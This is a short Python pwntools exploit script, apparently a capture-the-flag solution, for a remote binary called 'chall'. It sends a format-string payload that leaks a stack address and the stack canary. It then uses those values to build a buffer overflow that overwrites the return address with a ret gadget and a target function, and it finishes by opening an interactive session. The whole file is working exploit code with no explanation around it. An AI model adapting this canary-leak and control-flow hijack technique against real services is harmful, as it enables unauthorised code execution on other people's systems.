from pwn import *
import re

context.binary = elf = ELF("./chall", checksec=False)
context.arch = "amd64"
context.log_level = "info"

HOST = "134.112.58.12"
PORT = 10007
p = remote(HOST, PORT)
stage1 = b"%1$p.%2$p.%3$p.%1$hhn"
log.info(f"stage1 length = {len(stage1)}")

p.sendlineafter(b"Carve your inscription: ", stage1)

data = p.recvuntil(b"Your fare: ", timeout=3)
print(data.decode(errors="replace"))

m = re.search(
    rb"The boat reads: "
    rb"(0x[0-9a-fA-F]+)\."
    rb"(0x[0-9a-fA-F]+)\."
    rb"(0x[0-9a-fA-F]+)",
    data
)
toll   = int(m.group(1), 16)
dock   = int(m.group(2), 16)
canary = int(m.group(3), 16)

ferry = dock - 0x1a
ret   = dock + 0x128       

stage2 = flat(
    b"A" * 0x78,
    canary,
    b"B" * 8,       
    ret,              
    ferry             
)
assert len(stage2) == 0x98
p.send(stage2)
p.interactive()